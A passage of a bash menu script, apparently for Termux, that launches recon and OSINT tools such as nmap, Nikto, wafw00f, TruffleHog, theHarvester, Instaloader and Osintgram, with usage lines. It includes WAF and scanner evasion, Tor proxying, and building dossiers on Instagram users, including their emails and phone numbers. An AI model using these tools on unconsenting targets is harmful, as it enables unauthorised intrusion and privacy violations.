                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Quick scan:        nmap -F target${RESET}\n"
                    printf "  ${WH}Full port scan:    nmap -p- target${RESET}\n"
                    printf "  ${WH}Service version:   nmap -sV target${RESET}\n"
                    printf "  ${WH}OS detection:      nmap -O target${RESET}\n"
                    printf "  ${WH}Ping sweep:        nmap -sn 192.168.1.0/24${RESET}\n"
                    printf "  ${WH}Aggressive scan:   nmap -A target${RESET}\n"
                    printf "  ${WH}Stealth SYN:       nmap -sS target${RESET}\n"
                    printf "  ${WH}Script scan:       nmap --script=default target${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Always have written permission before scanning targets.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run nmap${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r nm_ch
                    case "${nm_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target (IP/domain/range): ${RESET}"; read -r nmap_target
                            printf "  ${WH}Flags [-F/-sV/-A/-p-/etc] (default -F): ${RESET}"; read -r nmap_flags
                            [[ -z "$nmap_flags" ]] && nmap_flags="-F"
                            echo ""
                            _dv21
                            nmap $nmap_flags "$nmap_target" 2>/dev/null | tee -a "$HACKDIR/nmap_$(date +%Y%m%d_%H%M).txt"
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing nmap...${RESET}\n\n"
                            pkg install nmap -y
                            echo ""
                            command -v nmap &>/dev/null && printf "  ${GRN}✓ nmap installed.${RESET}\n" || printf "  ${YEL}Try: pkg install nmap${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [3] WAFW00F ───────────────────────────────────────────────
            3)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [3] WAFW00F  ·  WAF FINGERPRINTING${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}wafw00f detects and fingerprints Web Application Firewalls (WAFs).${RESET}\n"
                    printf "  ${WH}Identifies Cloudflare, Akamai, AWS Shield, Sucuri and 130+ more.${RESET}\n"
                    printf "  ${WH}Passive detection first — only goes active if needed.${RESET}\n"
                    printf "  ${WH}Know the wall before you knock on it. SOI. 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic detect:      wafw00f https://target.com${RESET}\n"
                    printf "  ${WH}Scan all WAFs:     wafw00f -a https://target.com${RESET}\n"
                    printf "  ${WH}JSON output:       wafw00f -o result.json https://target.com${RESET}\n"
                    printf "  ${WH}List all WAFs:     wafw00f -l${RESET}\n"
                    printf "  ${WH}Proxy through Tor: wafw00f --proxy socks5://127.0.0.1:9050 https://target.com${RESET}\n"
                    printf "  ${WH}Help:              wafw00f --help${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Useful before nikto — know if there's a WAF to evade.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run wafw00f${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r wf_ch
                    case "${wf_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target URL: ${RESET}"; read -r wf_target
                            printf "  ${WH}Flags [-a/--proxy/etc] (or ENTER to skip): ${RESET}"; read -r wf_flags
                            echo ""
                            _dv21
                            wafw00f $wf_flags "$wf_target" 2>/dev/null | tee -a "$HACKDIR/wafw00f_$(date +%Y%m%d_%H%M).txt"
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing wafw00f...${RESET}\n\n"
                            pip install wafw00f --break-system-packages 2>/dev/null || pip3 install wafw00f --break-system-packages
                            echo ""
                            command -v wafw00f &>/dev/null && printf "  ${GRN}✓ wafw00f installed.${RESET}\n" || printf "  ${YEL}Try: pip install wafw00f --break-system-packages${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [4] PHOTON ────────────────────────────────────────────────
            4)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [4] PHOTON  ·  WEB CRAWLER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Photon is a fast intelligent web crawler built for OSINT.${RESET}\n"
                    printf "  ${WH}Harvests URLs, emails, social media links, files, and JS strings.${RESET}\n"
                    printf "  ${WH}Crawls target websites and extracts everything linkable in one pass.${RESET}\n"
                    printf "  ${WH}Outputs clean structured results — essential pre-scan recon tool.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic crawl:       python3 photon.py -u https://target.com${RESET}\n"
                    printf "  ${WH}Set depth:         python3 photon.py -u https://target.com -l 3${RESET}\n"
                    printf "  ${WH}Set threads:       python3 photon.py -u https://target.com -t 10${RESET}\n"
                    printf "  ${WH}Output folder:     python3 photon.py -u https://target.com -o out/${RESET}\n"
                    printf "  ${WH}Only URLs:         python3 photon.py -u https://target.com --only-urls${RESET}\n"
                    printf "  ${WH}Help:              python3 photon.py --help${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run photon${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r ph_ch
                    case "${ph_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target URL: ${RESET}"; read -r ph_target
                            printf "  ${WH}Depth (default 2): ${RESET}"; read -r ph_depth
                            [[ -z "$ph_depth" ]] && ph_depth=2
                            echo ""
                            _dv21
                            python3 ~/photon/photon.py -u "$ph_target" -l "$ph_depth" -o "$HACKDIR/photon_$(date +%Y%m%d_%H%M)" 2>/dev/null
                            echo ""; printf "  ${GRN}✓ Output saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Cloning Photon from GitHub...${RESET}\n\n"
                            git clone https://github.com/s0md3v/Photon ~/photon 2>/dev/null && pip install -r ~/photon/requirements.txt --break-system-packages
                            echo ""
                            [[ -f ~/photon/photon.py ]] && printf "  ${GRN}✓ Photon ready at ~/photon/photon.py${RESET}\n" || printf "  ${YEL}Try: git clone https://github.com/s0md3v/Photon ~/photon${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [5] NIKTO ─────────────────────────────────────────────────
            5)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [5] NIKTO  ·  WEB SERVER SCANNER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Nikto is an open-source web server vulnerability scanner.${RESET}\n"
                    printf "  ${WH}Checks for 6700+ dangerous files, outdated software and CVEs.${RESET}\n"
                    printf "  ${WH}Finds misconfigurations, default credentials, server fingerprints.${RESET}\n"
                    printf "  ${WH}Runs loud — the server will log your scan. Have permission. 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic scan:        nikto -h https://target.com${RESET}\n"
                    printf "  ${WH}Custom port:       nikto -h target.com -p 8080${RESET}\n"
                    printf "  ${WH}Save report:       nikto -h target.com -o report.txt${RESET}\n"
                    printf "  ${WH}SSL scan:          nikto -h target.com -ssl${RESET}\n"
                    printf "  ${WH}Evasion mode:      nikto -h target.com -evasion 1${RESET}\n"
                    printf "  ${WH}List plugins:      nikto -list-plugins${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Always have written permission. Server logs your IP.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run nikto${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r nk_ch
                    case "${nk_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target URL or IP: ${RESET}"; read -r nk_target
                            printf "  ${WH}Extra flags (or ENTER to skip): ${RESET}"; read -r nk_flags
                            echo ""
                            _dv21
                            nikto -h "$nk_target" $nk_flags 2>/dev/null | tee -a "$HACKDIR/nikto_$(date +%Y%m%d_%H%M).txt"
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing nikto...${RESET}\n\n"
                            pkg install nikto -y
                            echo ""
                            command -v nikto &>/dev/null && printf "  ${GRN}✓ nikto installed.${RESET}\n" || printf "  ${YEL}Try: pkg install nikto${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [6] TRUFFLEHOG ────────────────────────────────────────────
            6)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [6] TRUFFLEHOG  ·  SECRET SCANNER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}TruffleHog searches git repositories for high-entropy secrets.${RESET}\n"
                    printf "  ${WH}Finds accidentally committed API keys, passwords, tokens and creds.${RESET}\n"
                    printf "  ${WH}Scans the full git history — not just current files. Deep search.${RESET}\n"
                    printf "  ${WH}Essential OSINT on any public repo — devs forget what they pushed.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Scan remote repo:  trufflehog git https://github.com/user/repo${RESET}\n"
                    printf "  ${WH}Scan local repo:   trufflehog git file://./path/to/repo${RESET}\n"
                    printf "  ${WH}GitHub org scan:   trufflehog github --org=orgname${RESET}\n"
                    printf "  ${WH}Only verified:     trufflehog git <url> --only-verified${RESET}\n"
                    printf "  ${WH}JSON output:       trufflehog git <url> --json${RESET}\n"
                    printf "  ${WH}Help:              trufflehog --help${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run trufflehog${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r tf_ch
                    case "${tf_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Repo URL (GitHub or file://): ${RESET}"; read -r tf_target
                            printf "  ${WH}Flags [--only-verified/--json/etc] (or ENTER): ${RESET}"; read -r tf_flags
                            echo ""
                            _dv21
                            trufflehog git "$tf_target" $tf_flags 2>/dev/null | tee -a "$HACKDIR/trufflehog_$(date +%Y%m%d_%H%M).txt"
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing trufflehog...${RESET}\n\n"
                            pip install trufflehog3 --break-system-packages 2>/dev/null || pip3 install trufflehog3 --break-system-packages
                            echo ""
                            command -v trufflehog &>/dev/null && printf "  ${GRN}✓ trufflehog installed.${RESET}\n" || printf "  ${YEL}Try: pip install trufflehog3 --break-system-packages${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [7] INSTALOADER ───────────────────────────────────────────
            7)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [7] INSTALOADER  ·  INSTAGRAM OSINT${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Instaloader downloads Instagram profiles, posts, stories and reels.${RESET}\n"
                    printf "  ${WH}Works on public profiles without login — pure passive OSINT.${RESET}\n"
                    printf "  ${WH}Downloads metadata too — timestamps, captions, geotags, hashtags.${RESET}\n"
                    printf "  ${WH}Build a full Instagram dossier on any public target. 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Download profile:  instaloader <username>${RESET}\n"
                    printf "  ${WH}No videos:         instaloader --no-videos <username>${RESET}\n"
                    printf "  ${WH}Stories only:      instaloader --stories <username>${RESET}\n"
                    printf "  ${WH}Highlights:        instaloader --highlights <username>${RESET}\n"
                    printf "  ${WH}Tagged posts:      instaloader --tagged <username>${RESET}\n"
                    printf "  ${WH}Metadata only:     instaloader --no-pictures <username>${RESET}\n"
                    printf "  ${WH}Save to folder:    instaloader -P ~/path/{target} <username>${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run instaloader${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r il_ch
                    case "${il_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Instagram username: ${RESET}"; read -r il_user
                            printf "  ${WH}Flags [--no-videos/--stories/--tagged/etc] (or ENTER): ${RESET}"; read -r il_flags
                            echo ""
                            _dv21
                            cd "$HACKDIR" && instaloader -P "${HACKDIR}/{target}" $il_flags "$il_user" 2>/dev/null
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR/$il_user${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing instaloader...${RESET}\n\n"
                            pip install instaloader --break-system-packages 2>/dev/null || pip3 install instaloader --break-system-packages
                            echo ""
                            command -v instaloader &>/dev/null && printf "  ${GRN}✓ instaloader installed.${RESET}\n" || printf "  ${YEL}Try: pip install instaloader --break-system-packages${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [8] THEHARVESTER ──────────────────────────────────────────
            8)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [8] THEHARVESTER  ·  EMAIL & DOMAIN OSINT${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}theHarvester is the industry standard OSINT email + domain recon tool.${RESET}\n"
                    printf "  ${WH}Pulls emails, names, subdomains, IPs from Google, Bing, LinkedIn and more.${RESET}\n"
                    printf "  ${WH}Passive recon — no direct contact with the target. SOI protocol.${RESET}\n"
                    printf "  ${WH}Used by red teams worldwide. Clean. Fast. Proven. 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic run:         theHarvester -d target.com -b google${RESET}\n"
                    printf "  ${WH}Multiple sources:  theHarvester -d target.com -b google,bing,yahoo${RESET}\n"
                    printf "  ${WH}All sources:       theHarvester -d target.com -b all${RESET}\n"
                    printf "  ${WH}Limit results:     theHarvester -d target.com -b google -l 200${RESET}\n"
                    printf "  ${WH}Save XML report:   theHarvester -d target.com -b google -f output${RESET}\n"
                    printf "  ${WH}List sources:      theHarvester -s${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Passive — server never knows you looked. Clean recon.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run theHarvester${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r th_ch
                    case "${th_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target domain: ${RESET}"; read -r th_domain
                            printf "  ${WH}Source [google/bing/all] (default google): ${RESET}"; read -r th_source
                            [[ -z "$th_source" ]] && th_source="google"
                            echo ""
                            _dv21
                            theHarvester -d "$th_domain" -b "$th_source" 2>/dev/null | tee -a "$HACKDIR/harvester_${th_domain}_$(date +%Y%m%d_%H%M).txt"
                            echo ""; printf "  ${GRN}✓ Saved to \$HACKDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing theHarvester...${RESET}\n\n"
                            pip install theHarvester --break-system-packages 2>/dev/null \
                                || pip3 install theHarvester --break-system-packages 2>/dev/null \
                                || (git clone https://github.com/laramies/theHarvester ~/theHarvester 2>/dev/null \
                                    && pip install -r ~/theHarvester/requirements/base.txt --break-system-packages 2>/dev/null)
                            echo ""
                            command -v theHarvester &>/dev/null && printf "  ${GRN}✓ theHarvester installed.${RESET}\n" || printf "  ${YEL}Try: git clone https://github.com/laramies/theHarvester ~/theHarvester${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [9] STEGHIDE ──────────────────────────────────────────────
            9)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [9] STEGHIDE  ·  STEGANOGRAPHY${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Steghide hides or extracts data inside image and audio files.${RESET}\n"
                    printf "  ${WH}Embed a secret file inside a JPEG — visually indistinguishable.${RESET}\n"
                    printf "  ${WH}Password-protected — nobody extracts without the passphrase.${RESET}\n"
                    printf "  ${WH}Supports JPEG, BMP, WAV, AU formats. Bojack never tells. 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Embed file:        steghide embed -cf cover.jpg -sf secret.txt${RESET}\n"
                    printf "  ${WH}Extract file:      steghide extract -sf cover.jpg${RESET}\n"
                    printf "  ${WH}With passphrase:   steghide embed -cf cover.jpg -sf secret.txt -p pass${RESET}\n"
                    printf "  ${WH}Get info:          steghide info cover.jpg${RESET}\n"
                    printf "  ${WH}No compression:    steghide embed -cf cover.jpg -sf secret.txt -Z${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[E]${RESET}  ${WH}Embed${RESET}  ·  ${C21}${BOLD}[X]${RESET}  ${WH}Extract${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r sh_ch
                    case "${sh_ch^^}" in
                        E)
                            echo ""
                            printf "  ${WH}Cover image path: ${RESET}"; read -r sh_cover
                            printf "  ${WH}Secret file path: ${RESET}"; read -r sh_secret
                            printf "  ${WH}Passphrase (ENTER for none): ${RESET}"; read -r sh_pass
                            echo ""
                            if [[ -n "$sh_pass" ]]; then
                                steghide embed -cf "$sh_cover" -sf "$sh_secret" -p "$sh_pass" 2>/dev/null
                            else
                                steghide embed -cf "$sh_cover" -sf "$sh_secret" 2>/dev/null
                            fi
                            echo ""; printf "  ${GRN}✓ Data embedded into $sh_cover${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        X)
                            echo ""
                            printf "  ${WH}Stego image path: ${RESET}"; read -r sh_stego
                            echo ""
                            steghide extract -sf "$sh_stego" 2>/dev/null
                            echo ""; printf "  ${GRN}✓ Extraction complete${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing steghide...${RESET}\n\n"
                            pkg install steghide -y
                            echo ""
                            command -v steghide &>/dev/null && printf "  ${GRN}✓ steghide installed.${RESET}\n" || printf "  ${YEL}Try: pkg install steghide${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [10] OSINTGRAM ────────────────────────────────────────────
            10)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [10] OSINTGRAM  ·  INSTAGRAM DEEP OSINT${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Osintgram is a dedicated Instagram OSINT tool built for investigators.${RESET}\n"
                    printf "  ${WH}Pull followers, following, posts, tagged locations and more.${RESET}\n"
                    printf "  ${WH}Dump profile data, email addresses, phone numbers where exposed.${RESET}\n"
                    printf "  ${WH}Requires a throwaway Instagram account configured in credentials.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Setup:             cd ~/Osintgram && python3 main.py <target>${RESET}\n"
                    printf "  ${WH}Get followers:     followers${RESET}\n"
                    printf "  ${WH}Get following:     followings${RESET}\n"
                    printf "  ${WH}Get tagged:        tagged${RESET}\n"
                    printf "  ${WH}Get emails:        email${RESET}\n"
                    printf "  ${WH}Get phone numbers: phone${RESET}\n"
                    printf "  ${WH}Get all info:      info${RESET}\n"
                    printf "  ${WH}Get captions:      captions${RESET}\n"
                    printf "  ${WH}Help:              help${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Use a throwaway account. Never your real credentials.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run Osintgram${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r og2_ch
                    case "${og2_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Target Instagram username: ${RESET}"; read -r og2_target
                            echo ""
                            _dv21
                            if [[ -d ~/Osintgram ]]; then
                                cd ~/Osintgram && python3 main.py "$og2_target" 2>/dev/null
                                cd ~
                            else
                                printf "  ${RED}Osintgram not found — run [I] to install first${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing Osintgram...${RESET}\n\n"
                            pkg install git python3 -y 2>/dev/null
                            git clone https://github.com/Datalux/Osintgram.git ~/Osintgram 2>/dev/null || printf "  ${YEL}Already cloned or git failed${RESET}\n"
                            [[ -d ~/Osintgram ]] && pip install -r ~/Osintgram/requirements.txt --break-system-packages 2>/dev/null
                            echo ""
                            [[ -d ~/Osintgram ]] && printf "  ${GRN}✓ Osintgram installed at ~/Osintgram${RESET}\n" || printf "  ${YEL}Check git and try: git clone https://github.com/Datalux/Osintgram.git ~/Osintgram${RESET}\n"
                            printf "  ${FADE}Next: add credentials to ~/Osintgram/credentials.ini${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [11] GITLEAKS ─────────────────────────────────────────────
            11)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [11] GITLEAKS  ·  SECRET SCANNER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Gitleaks scans git repositories for exposed secrets and credentials.${RESET}\n"
                    printf "  ${WH}Finds API keys, passwords, tokens, private keys left in commit history.${RESET}\n"
                    printf "  ${WH}Scans the full git history — not just the current state of the repo.${RESET}\n"
                    printf "  ${WH}Fast, reliable, used by security teams worldwide. SOI approved.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Scan local repo:   gitleaks detect --source /path/to/repo${RESET}\n"
                    printf "  ${WH}Scan with report:  gitleaks detect --source . --report-path leak.json${RESET}\n"
                    printf "  ${WH}Scan git history:  gitleaks detect --source . --log-opts="--all"${RESET}\n"
                    printf "  ${WH}Protect (pre-commit): gitleaks protect --staged${RESET}\n"
                    printf "  ${WH}Help:              gitleaks --help${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run scan${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r gl_ch
                    case "${gl_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Path to repo (ENTER for current dir): ${RESET}"; read -r gl_path
                            [[ -z "$gl_path" ]] && gl_path="."
                            gl_path=$(_xpath "$gl_path")
                            local gl_report="$HACKDIR/gitleaks_$(date +%Y%m%d_%H%M).json"
                            echo ""
                            _dv21
                            gitleaks detect --source "$gl_path" --report-path "$gl_report" 2>/dev/null
                            echo ""
                            [[ -f "$gl_report" ]] && printf "  ${GRN}✓ Report saved: %s${RESET}\n" "$gl_report" || printf "  ${FADE}No leaks found or gitleaks not installed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing gitleaks...${RESET}\n\n"
                            pkg install golang git -y 2>/dev/null
                            go install github.com/zricethezav/gitleaks/v8@latest 2>/dev/null
                            local gl_bin=$(find ~/go/bin -name "gitleaks" 2>/dev/null | head -1)
                            if [[ -n "$gl_bin" ]]; then
                                cp "$gl_bin" "$PREFIX/bin/gitleaks" 2>/dev/null
                                printf "  ${GRN}✓ gitleaks installed${RESET}\n"
                            else
                                printf "  ${YEL}Try manually: pkg install golang && go install github.com/zricethezav/gitleaks/v8@latest${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [12] EXIFTOOL ─────────────────────────────────────────────
            12)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [12] EXIFTOOL  ·  METADATA INTEL${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}ExifTool reads and strips metadata embedded in photos, videos and docs.${RESET}\n"
                    printf "  ${WH}GPS coordinates, camera model, software version, creation timestamps.${RESET}\n"
                    printf "  ${WH}OSINT gold — a single photo can leak exact location and device info.${RESET}\n"
                    printf "  ${WH}Strip all metadata before sharing. Extract it from targets. SOI.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Read all metadata:    exiftool photo.jpg${RESET}\n"
                    printf "  ${WH}GPS only:             exiftool -GPS:all photo.jpg${RESET}\n"
                    printf "  ${WH}Strip all metadata:   exiftool -all= photo.jpg${RESET}\n"
                    printf "  ${WH}Strip GPS only:       exiftool -GPS:all= photo.jpg${RESET}\n"
